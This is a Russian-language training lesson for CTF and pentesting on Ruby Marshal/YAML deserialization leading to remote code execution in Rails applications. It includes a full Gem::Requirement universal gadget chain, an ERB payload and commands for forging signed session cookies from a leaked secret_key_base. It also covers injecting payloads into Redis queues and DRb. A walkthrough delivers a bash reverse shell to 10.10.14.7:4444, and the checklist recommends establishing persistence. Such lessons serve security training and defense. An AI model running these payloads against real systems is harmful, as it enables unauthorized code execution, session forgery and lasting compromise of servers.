---
id: web-ruby-deser
title: "Ruby Marshal/YAML deserialization: Rails-class RCE"
category: web
parent: web-deser-languages
difficulty: hard
order: 3
tags: [ruby, marshal, yaml, deserialization, rails, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Ruby-десериализация: Marshal.load и YAML.load gadget'ы, Rails-цепочки, universal deserialisation gadget."
---
Ruby сериализует объекты через `Marshal` (бинарь) и `YAML` (текст). `Marshal.load` и `YAML.load` (без `safe_load`) восстанавливают **произвольные объекты** и вызывают их методы (`_load`, `init_with`, `hash`, `to_s`), что даёт RCE. В Rails-приложениях есть готовые gadget-цепочки («universal deserialization gadget» для Rails 5/6), а подписанные cookie с `Marshal` — классическая точка. Этот урок — про генерацию payload, обход подписи и реальные точки входа.

Ruby-десериализация интересна тем, что «магия» живёт не в формате, а в наборе классов, уже загруженных приложением: Rails, ActiveSupport, RubyGems, Net::*. Именно поэтому одна и та же payload работает или не работает в зависимости от точной версии фреймворка.

## Теория: где ломается

- **`Marshal.load(input)`** — восстанавливает любой класс; через цепочку `_load`/`init_with`/`hash` → RCE.
- **`YAML.load(input)`** — до Psych 4 (Ruby 3.1) unsafe by default; тег `!ruby/object:...` создаёт объекты, `!ruby/object:Gem::...` строит цепочки.
- **Rails cookies** — `Marshal` + подпись (`secret_key_base`). Если ключ утёк/слаб — подделываем сессию с gadget.
- **`ActiveSupport::MessageVerifier`/`MessageEncryptor`** — те же риски при утечке ключа.
- **`ActiveRecord` сериализованные колонки** — `serialize :field` использует YAML/Marshal.

Ключевое отличие от Python: RCE не в «магии формата», а в **gadget-цепочке из классов, уже загруженных приложением** (Rails, RubyGems, ActiveSupport).

## Байтовая структура Marshal

`Marshal.dump` выдаёт бинарь, начинающийся с `\x04\x08` (major/minor версии). Признак в cookie/параметре после base64: `BAhv` / `BAh7`. Быстрая проверка:

```bash
echo 'BASE64' | base64 -d | xxd | head
# 0408  — это Marshal
ruby -e 'p Marshal.load(File.binread("payload"))'
```

YAML-признаки: `--- !ruby/object:` / `--- !ruby/hash:` в декодированном тексте. Полезно сразу отличить: `\x04\x08` — бинарь, `---` — текст.

## YAML-инъекция (простые payload)

Простейший вариант через `ERB` (срабатывает, если есть gadget, вызывающий `result`/`src`):

```yaml
--- !ruby/object:ERB
src: "<%= system('id') %>"
```

Тег `!ruby/object:ClassName` создаёт объект класса; если какой-то метод цепочки приведёт его к строке/вызовет `result`, произойдёт исполнение. Более практичный — **universal gadget** (зависит от версии Rails/Ruby):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

Этот YAML запускает `Kernel#system('id')` через `Gem::RequestSet#resolve` → `Net::WriteAdapter#write` → `system`. Якоря `&1` и ссылки важны: они строят циклический граф, который и запускает цепочку.

## Marshal-инъекция

Бинарный payload генерируют скриптом под конкретную версию Rails/Ruby. Общая схема:

```ruby
# пример генерации universal gadget (Rails 5.x/6.x)
require 'erb'
# строим цепочку объектов, где финальный вызов -> Kernel#system
# затем Marshal.dump(obj) -> бинарь
```

Готовые публичные скрипты: `rails_universal_gadget`, `Ruby-Marshal-RCE`, `universal-deserialization-gadget`. Вывод обычно отдают в base64 или hex:

```bash
ruby gadget.rb "id" > payload.bin
base64 -w0 payload.bin
```

## Разобранный пример: Rails session cookie

Шаг 1 — находим `secret_key_base` (утечки: `.env`, git-история, `config/master.key`, дефолт в конфиге, Docker-образ).

```bash
grep -r "secret_key_base" . --include='*.yml' --include='*.rb' --include='.env*'
git log -p | grep -i secret_key_base
```

Шаг 2 — генерируем malicious cookie с gadget:

```bash
ruby gadget.rb "id" --secret "$SECRET_KEY_BASE" > cookie
```

Шаг 3 — подставляем cookie:

```bash
curl -s "https://app.example/" -H "Cookie: _session_id=<cookie>"
```

Шаг 4 — RCE (OOB/reverse shell). Если cookie зашифрован (`MessageEncryptor`, `encrypted_cookie_salt`), нужен ещё и `secret_key_base` для ключа шифрования — тот же скрипт умеет и это. Доказательство без интерактива:

```bash
ruby gadget.rb "id > /tmp/proof" --secret "$SECRET_KEY_BASE" > cookie
# затем читаем результат через любой файловый LFI/SSRF или reverse shell
```

## Где искать точки

- Cookies (`Marshal`-сериализация сессий; base64 начинается с `BAh`).
- `Marshal.load`/`YAML.load` в коде: кеш, RPC, Redis, Sidekiq (сериализует аргументы).
- Rails `MessageVerifier`/`MessageEncryptor` с утёкшим ключом.
- RPC/DRb (Distributed Ruby), Resque.
- Redis-кеш с Marshal; `ActiveRecord serialize`.
- Признаки в ошибке: `Marshal`, `Psych`, `undefined class/module`, `_load`.

Поиск по исходникам:

```bash
grep -rn "Marshal.load\|YAML.load\|Psych.load\|unserialize" . --include='*.rb'
grep -rn "secret_key_base\|master.key" . --include='*.rb' --include='*.yml'
```

## Разобранный пример: Sidekiq/Resque (очереди)

Sidekiq по умолчанию сериализует аргументы задач в JSON, но с плагином `Sidekiq::Client` / кастомным `Marshal`-сериализатором кладёт в Redis Marshal-блобы. Если Redis доступен без auth:

```bash
redis-cli -h TARGET RPUSH queue:default '<marshal payload>'
```

Воркер десериализует → RCE. Это тот же паттерн «SSRF/доступ к Redis → очередь → RCE».

## Разобранный пример: DRb (Distributed Ruby)

DRb использует `Marshal` по сети. Если порт DRb открыт:

```bash
# проверяем, отвечает ли DRb
ruby -e 'require "drb"; p DRbObject.new_with_uri("druby://TARGET:8787")'
# доставляем Marshal-payload (по сути тот же gadget, что для cookie)
```

DRb-интерфейсы часто не аутентифицированы вовсе, что делает их приоритетной целью.

## Инструменты

- **`rails_universal_gadget`** и публичные скрипты (`Ruby-Marshal-RCE`).
- **`ruby`** — локальная генерация/проверка (`ruby -e 'p Marshal.load(...)'`).
- **Burp Repeater** — доставка cookie.
- **`ysoserial`** — для Java (смежная тема), для Ruby — свои скрипты.
- **`git`/`grep`** — поиск утёкшего `secret_key_base`.
- **`brakeman`** — статический анализ Rails на `Marshal.load`/`YAML.load`.

```bash
# статический поиск опасных загрузчиков в Rails-проекте
brakeman -q --no-pager | grep -iE 'marshal|yaml|deserial'
```

## Marshal vs YAML: что выбрать

| Критерий | Marshal | YAML |
|----------|---------|------|
| Формат | бинарь (`\x04\x08`) | текст |
| Признак | base64 `BAh` | `--- !ruby/object:` |
| Где встречается | cookies, Redis, Sidekiq | конфиги, API, `serialize`-колонки |
| Unsafe по умолчанию | всегда | до Ruby 3.1 (Psych 4) |
| Доставка | base64/hex | как есть / в теле |

Начинайте с того формата, который реально видите в перехвате; не подменяйте один другим.

## Защита и её обход

Безопасный путь: `Marshal.load` не применять к недоверенным данным; для YAML — `YAML.safe_load` (Psych 4+ делает это по умолчанию); не хранить `secret_key_base` в репозитории. Обходы слабых защит: подмена загрузчика, использование `Psych.unsafe_load`, эксплуатация утёкшего ключа для подписи. Ещё вариант — если приложение сравнивает класс до `load`, можно подсунуть подкласс, проходящий проверку.

## Частые ошибки

- **Забыть про подпись cookie.** Нужен `secret_key_base`, иначе Rails отбросит cookie.
- **Использовать gadget не под ту версию Rails/Ruby.** Набор доступных классов меняется.
- **Путать YAML и Marshal.** Разные форматы, разная доставка.
- **Игнорировать Ruby 3.1+.** `YAML.load` стал safe по умолчанию (Psych 4).
- **Ждать stdout в ответе.** Деструкторы не возвращают вывод — OOB.
- **Сдаваться на «не тот формат».** Пробуйте base64/hex/url-encoding.
- **Ломать прод.** RCE — только с согласия.

## Что дальше / решение

1. Cookie начинается с `BAh`/`BAhv` после base64 → это Marshal, ищите ключ и версию Rails.
2. Параметр уходит в `YAML.load` → пробуйте `--- !ruby/object:ERB`/universal gadget.
3. Есть `secret_key_base` → подделывайте подписанную cookie с gadget.
4. Нет ключа → ищите SSRF/другую утечку; сам по себе gadget не пройдёт проверку подписи.
5. RCE подтверждён → ставьте **устойчивый** канал (reverse shell/tunnel) и **читайте результат обратно** как доказательство.
6. Тупик → переходите к `web-python-deser`/`web-php-deser-chains` или к очереди Redis.

## Справочная таблица

| Признак | Формат | Что делать |
|---------|--------|------------|
| base64 `BAh`/`BAhv` | Marshal | искать ключ/версию |
| `\x04\x08` в hex | Marshal | разобрать `ruby -e` |
| `--- !ruby/object:` | YAML | universal gadget |
| `--- !ruby/hash:` | YAML | hash-объект |
| `Psych::` в ошибке | YAML | unsafe_load |
| `undefined class/module` | нет класса | сменить gadget |
| `_session_id` cookie | Rails | нужен secret |
## Практический чек-лист по шагам

1. **Детект формата.** Cookie/параметр после base64 начинается с `BAh` → Marshal; в теле видно `--- !ruby/object:` → YAML.
2. **Определение стека.** Rails (`_session_id`, `_rails`), версия Rails/Ruby (баннеры, `Gemfile.lock` при утечке, поведение cookie).
3. **Поиск ключа.** `secret_key_base`, `config/master.key`, `.env`, git-история, Docker-слои, дефолты фреймворка.
4. **Выбор гаджета.** Universal gadget под версию Rails; для YAML — `Gem::Requirement`-цепочка; для простых случаев — `ERB` с `src`.
5. **Генерация.** Публичный скрипт `rails_universal_gadget`/`Ruby-Marshal-RCE`, вывод в base64.
6. **Доставка.** Cookie в том же виде (подпись/шифрование тем же ключом).
7. **Эксфильтрация.** OOB/reverse shell; read-back доказательство.
8. **Закрепление.** Устойчивый канал + фиксация версии гаджета.

## Разобранный пример 5: полный walkthrough CTF-кейса

Дано: Rails-приложение, в ответе — cookie `_session_id=<base64>`, начинающийся с `BAh`. Рядом лежит `/admin` с 403.

```bash
# 1. подтверждаем Marshal
echo "$COOKIE" | base64 -d | xxd | head -1
# 00000000: 0408  ...            -> Marshal

# 2. ищем secret_key_base в утечке исходников
curl -s https://app.example/.env 2>/dev/null | grep -i secret
# SECRET_KEY_BASE=0f9a... (или берём из git-истории / config/master.key)

# 3. генерируем гаджет под версию Rails
ruby rails_universal_gadget.rb "id" "$SECRET_KEY_BASE" > cookie.bin

# 4. доставляем
curl -s -b "_session_id=$(base64 -w0 cookie.bin)" https://app.example/admin

# 5. результат часто OOB -> reverse shell
ruby rails_universal_gadget.rb \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'" \
  "$SECRET_KEY_BASE" > cookie.bin
```

Если ключ не найден — вектор `blocked`: без `secret_key_base` подпись не сойдётся. В этом случае ищем другую точку (Redis/Sidekiq/DRb), где Marshal десериализуется без проверки подписи.

## Разобранный пример 6: YAML-инъекция в API

Если API принимает YAML (`Content-Type: application/x-yaml`) и вызывает `YAML.load`:

```bash
curl -s https://app.example/api/import \
  -H 'Content-Type: application/x-yaml' \
  --data-binary $'--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module \'Kernel\'\n               method_id: :system\n           git_set: id\n       method_id: :resolve\n'
```

Признак успеха — обратный DNS/HTTP-запрос к нашему листенеру или файл-маркер. Если приложение отвечает 200 и «игнорирует» объект — значит YAML распарсен, но гаджет не сработал под эту версию; подбирайте цепочку под точную версию RubyGems.

## Квиз

```quiz
- question: "Какой метод Ruby опасен при недоверенном вводе?"
  options:
    - "JSON.parse"
    - "Marshal.load"
    - "String#split"
    - "Array#map"
  answer: 1
  explanation: "Marshal восстанавливает произвольные объекты."
- question: "Что нужно для подделки Rails session cookie?"
  options:
    - "Только cookie"
    - "secret_key_base и gadget под версию"
    - "TLS"
    - "SQL"
  answer: 1
  explanation: "Подпись проверяется ключом."
- question: "Какой YAML-тег создаёт Ruby-объект?"
  options:
    - "!!str"
    - "!ruby/object:ClassName"
    - "!!int"
    - "!!map"
  answer: 1
  explanation: "Ruby-специфичный тег."
- question: "Почему universal gadget зависит от версии?"
  options:
    - "Он длинный"
    - "Классы цепочки меняются между версиями Rails/Ruby"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "Набор доступных классов различается."
- question: "Какая версия Ruby сделала YAML.load безопасным по умолчанию?"
  options:
    - "2.7"
    - "3.1"
    - "2.4"
    - "1.9"
  answer: 1
  explanation: "Psych 4 / Ruby 3.1."
```

## Где пригодится

- **CTF (Web):** задачи на Ruby-deser.
- **Bug bounty:** Rails cookie RCE — критичный отчёт.
- **Пентест:** аудит Rails-приложений.
- **Работа (AppSec):** `safe_load`, JSON-сериализация, защита `secret_key_base`, обновление Rails.
